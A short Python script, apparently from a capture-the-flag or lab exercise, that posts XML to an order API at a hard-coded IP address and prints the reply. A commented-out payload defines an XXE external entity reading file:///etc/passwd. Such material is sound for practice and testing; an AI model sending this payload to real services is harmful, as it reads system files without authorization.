import requests

url = 'http://178.62.32.210:31868/api/order'

# xml = '''
# <?xml version="1.0" encoding="ISO-8859-1"?>
# <!DOCTYPE foo [ <!ELEMENT foo ANY >
# <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
# <food>burger</food>
# '''

xml = '''
<?xml version='1.0' standalone='yes'?>
<food>burger</food>
'''

headers = {'Content-Type': 'application/xml'}
req = requests.post(
    url,
    data=xml,
    headers=headers
) 
print(req.text)
